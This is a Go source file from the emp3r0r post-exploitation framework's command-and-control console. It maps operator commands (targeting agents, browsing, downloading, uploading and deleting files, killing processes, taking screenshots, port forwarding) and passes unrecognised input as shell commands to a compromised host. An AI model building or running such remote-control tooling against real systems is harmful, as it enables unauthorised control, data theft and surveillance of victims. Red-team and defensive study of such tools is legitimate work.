//go:build linux
// +build linux

package cc

import (
	"os"
	"strconv"
	"strings"
	"sync"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

type Command struct {
	Name   string
	Help   string
	Func   interface{}
	HasArg bool
}

// CommandMap holds all commands
var CommandMap = map[string]Command{
	HELP: {
		Name:   HELP,
		Help:   "Print this help, 'help <module>' gives help for a module",
		Func:   nil,
		HasArg: true,
	},
	"target": {
		Name:   "target",
		Help:   "Set target. eg. `target <index>`",
		Func:   setCurrentTarget,
		HasArg: true,
	},
	"file_manager": {
		Name: "file_manager",
		Help: "Browse remote files in your local file manager with SFTP protocol",
		Func: OpenFileManager,
	},
	"set": {
		Name:   "set",
		Help:   "Set an option. eg. `set <option> <value>`",
		Func:   setOptVal,
		HasArg: true,
	},
	"use": {
		Name:   "use",
		Help:   "Use a module. eg. `use <module_name>`",
		Func:   useModule,
		HasArg: true,
	},
	"run": {
		Name: "run",
		Help: "Run selected module, make sure you have set required options",
		Func: ModuleRun,
	},
	"info": {
		Name: "info",
		Help: "What options do we have?",
		Func: CliListOptions,
	},
	"upgrade_agent": {
		Name: "upgrade_agent",
		Help: "Upgrade agent on selected target, put agent binary in /tmp/emp3r0r/www/agent first",
		Func: UpgradeAgent,
	},
	"upgrade_cc": {
		Name: "upgrade_cc",
		Help: "Upgrade emp3r0r from GitHub",
	},
	"ls": {
		Name:   "ls",
		Help:   "List current directory of selected agent",
		Func:   FSNoArgCmd,
		HasArg: true,
	},
	"mv": {
		Name:   "mv",
		Help:   "Move a file to another location on selected target",
		Func:   FSCmdSrcDst,
		HasArg: true,
	},
	"cp": {
		Name:   "cp",
		Help:   "Copy a file to another location on selected target",
		Func:   FSCmdSrcDst,
		HasArg: true,
	},
	"cd": {
		Name:   "cd",
		Help:   "Change current working directory of selected agent",
		Func:   FSCmdDst,
		HasArg: true,
	},
	"rm": {
		Name:   "rm",
		Help:   "Delete a file/directory on selected agent",
		Func:   FSCmdDst,
		HasArg: true,
	},
	"mkdir": {
		Name:   "mkdir",
		Help:   "Create new directory on selected agent",
		Func:   FSCmdDst,
		HasArg: true,
	},
	"pwd": {
		Name:   "pwd",
		Help:   "Current working directory of selected agent",
		Func:   FSNoArgCmd,
		HasArg: true,
	},
	"ps": {
		Name:   "ps",
		Help:   "Process list of selected agent",
		Func:   FSNoArgCmd,
		HasArg: true,
	},
	"net_helper": {
		Name:   "net_helper",
		Help:   "Network helper: ip addr, ip route, ip neigh",
		Func:   FSNoArgCmd,
		HasArg: true,
	},
	"kill": {
		Name:   "kill",
		Help:   "Terminate a process on selected agent: eg. `kill <pid>`",
		Func:   FSCmdDst,
		HasArg: true,
	},
	"get": {
		Name:   "get",
		Help:   "Download a file from selected agent",
		Func:   DownloadFromAgent,
		HasArg: true,
	},
	"put": {
		Name:   "put",
		Help:   "Upload a file to selected agent",
		Func:   UploadToAgent,
		HasArg: true,
	},
	"screenshot": {
		Name: "screenshot",
		Help: "Take a screenshot of selected agent",
		Func: TakeScreenshot,
	},
	"suicide": {
		Name: "suicide",
		Help: "Kill agent process, delete agent root directory",
		Func: Suicide,
	},
	"ls_targets": {
		Name: "ls_targets",
		Help: "List all targets",
		Func: ls_targets,
	},
	"ls_modules": {
		Name: "ls_modules",
		Help: "List all modules",
		Func: ListModules,
	},
	"search": {
		Name:   "search",
		Help:   "Search modules",
		Func:   ModuleSearch,
		HasArg: true,
	},
	"ls_port_fwds": {
		Name: "ls_port_fwds",
		Help: "List all port mappings",
		Func: ListPortFwds,
	},
	"debug": {
		Name:   "debug",
		Help:   "Set debug level: -1 (least verbose) to 1 (most verbose)",
		Func:   setDebugLevel,
		HasArg: true,
	},
	"delete_port_fwd": {
		Name:   "delete_port_fwd",
		Help:   "Delete a port mapping",
		Func:   DeletePortFwdSession,
		HasArg: true,
	},
	"exit": {
		Name: "exit",
		Help: "Exit",
	},
	"label": {
		Name:   "label",
		Help:   "Set a label for a target",
		Func:   setTargetLabel,
		HasArg: true,
	},
}

// CmdTime Record the time spent on each command
var (
	CmdTime      = make(map[string]string)
	CmdTimeMutex = &sync.Mutex{}
)

const HELP = "help" // fuck goconst

// CmdHandler processes user commands
func CmdHandler(cmd string) (err error) {
	cmdSplit := util.ParseCmd(cmd)
	if len(cmdSplit) == 0 {
		return
	}

	switch {
	case cmd == "":
		return

	case cmdSplit[0] == "upgrade_cc":
		force := false
		if len(cmdSplit) == 2 {
			force = cmdSplit[1] == "-f"
		}
		err = UpdateCC(force)
		if err != nil {
			return
		}
		TmuxDeinitWindows()
		os.Exit(0)

	case cmdSplit[0] == HELP:
		if len(cmdSplit) > 2 {
			CliPrintError("WTF?")
			return
		}
		if len(cmdSplit) == 1 {
			CmdHelp("")
			return
		}
		CmdHelp(cmdSplit[1])

	default:
		command, exists := CommandMap[cmdSplit[0]]
		if !exists {
			if CurrentTarget != nil {
				CliPrintWarning("Exec: %s on %s", strconv.Quote(cmd), strconv.Quote(CurrentTarget.Tag))
				SendCmdToCurrentTarget(cmd, "")
				return
			}
			CliPrintError("No agent selected, try `target <index>`")
			return
		}
		if command.HasArg {
			command.Func.(func(string))(cmd)
		} else {
			command.Func.(func())()
		}
	}
	return
}

func useModule(cmd string) {
	cmdSplit := strings.Fields(cmd)
	if len(cmdSplit) != 2 {
		CliPrintError("use what? %s", strconv.Quote(cmd))
		return
	}
	defer SetDynamicPrompt()
	for mod := range ModuleHelpers {
		if mod == cmdSplit[1] {
			CurrentMod = cmdSplit[1]
			for k := range Options {
				delete(Options, k)
			}
			UpdateOptions(CurrentMod)
			CliPrintInfo("Using module %s", strconv.Quote(CurrentMod))
			ModuleDetails(CurrentMod)
			mod, exists := emp3r0r_data.Modules[CurrentMod]
			if exists {
				CliPrint("%s", mod.Comment)
			}
			CliListOptions()

			return
		}
	}
	CliPrintError("No such module: %s", strconv.Quote(cmdSplit[1]))
}

// CmdHelp prints help in two columns
// print help for modules
func CmdHelp(mod string) {
	help := make(map[string]string)
	if mod == "" {
		for cmd, cmdObj := range CommandMap {
			help[cmd] = cmdObj.Help
		}
		CliPrettyPrint("Command", "Help", &help)
		return
	}

	for modname, modObj := range emp3r0r_data.Modules {
		if mod == modObj.Name {
			if len(modObj.Options) > 0 {
				for opt, val_help := range modObj.Options {
					help[opt] = strings.Join(val_help, " ")
				}
			} else {
				help[modname] = "No options"
			}
			CliPrint("\n%s", modObj.Comment)
			CliPrettyPrint("Option", "Help", &help)
			return
		}
	}
	CliPrintError("Help yourself")
}

func setCurrentTarget(cmd string) {
	cmdSplit := strings.Fields(cmd)
	if len(cmdSplit) != 2 {
		CliPrintError("set target to what? %s", strconv.Quote(cmd))
		return
	}
	defer SetDynamicPrompt()
	var target_to_set *emp3r0r_data.AgentSystemInfo

	// select by tag or index
	target_to_set = GetTargetFromTag(strings.Join(cmdSplit[1:], " "))
	if target_to_set == nil {
		index, e := strconv.Atoi(cmdSplit[1])
		if e == nil {
			target_to_set = GetTargetFromIndex(index)
		}
	}

	select_agent := func(a *emp3r0r_data.AgentSystemInfo) {
		CurrentTarget = a
		GetTargetDetails(CurrentTarget)
		CliPrintSuccess("Now targeting %s", CurrentTarget.Tag)
		SetDynamicPrompt()

		// kill shell and sftp window
		if AgentSFTPPane != nil {
			CliPrintInfo("Updating sftp window")
			err = AgentSFTPPane.KillPane()
			if err != nil {
				CliPrintWarning("Updating sftp window: %v", err)
			}
			AgentSFTPPane = nil
		}
		if AgentShellPane != nil {
			CliPrintInfo("Updating shell window")
			err = AgentShellPane.KillPane()
			if err != nil {
				CliPrintWarning("Updating shell window: %v", err)
			}
			AgentShellPane = nil
		}

		CliPrint("Run `file_manager` to open a SFTP session")
		autoCompleteAgentExes(target_to_set)
	}

	if target_to_set == nil {
		// if still nothing
		CliPrintError("Target does not exist, no target has been selected")
		return

	} else {
		// lets start the bash shell
		go select_agent(target_to_set)
	}
}

func setTargetLabel(cmd string) {
	cmdSplit := strings.Fields(cmd)
	if len(cmdSplit) < 2 {
		CliPrintError("Invalid command %s, usage: 'label <tag/index> <label>'", strconv.Quote(cmd))
		return
	}
	target := new(emp3r0r_data.AgentSystemInfo)
	label := strings.Join(cmdSplit[2:], " ")

	// select by tag or index
	index, e := strconv.Atoi(cmdSplit[1])
	if e != nil {
		// try by tag
		target = GetTargetFromTag(cmdSplit[1])
		if target == nil {
			// cannot parse
			CliPrintError("Cannot set target label by index: %v", e)
			return
		}
	} else {
		// try by index
		target = GetTargetFromIndex(index)
	}

	// target exists?
	if target == nil {
		CliPrintError("Target does not exist")
		return
	}
	Targets[target].Label = label // set label
	labelAgents()
	CliPrintSuccess("%s has been labeled as %s", target.Tag, label)
	ListTargets() // update agent list
}

func setOptVal(cmd string) {
	cmdSplit := util.ParseCmd(cmd)
	if len(cmdSplit) < 2 {
		CliPrintError("set what?")
		return
	}
	// hand to SetOption helper
	SetOption(cmdSplit[1:])
	CliListOptions()
}
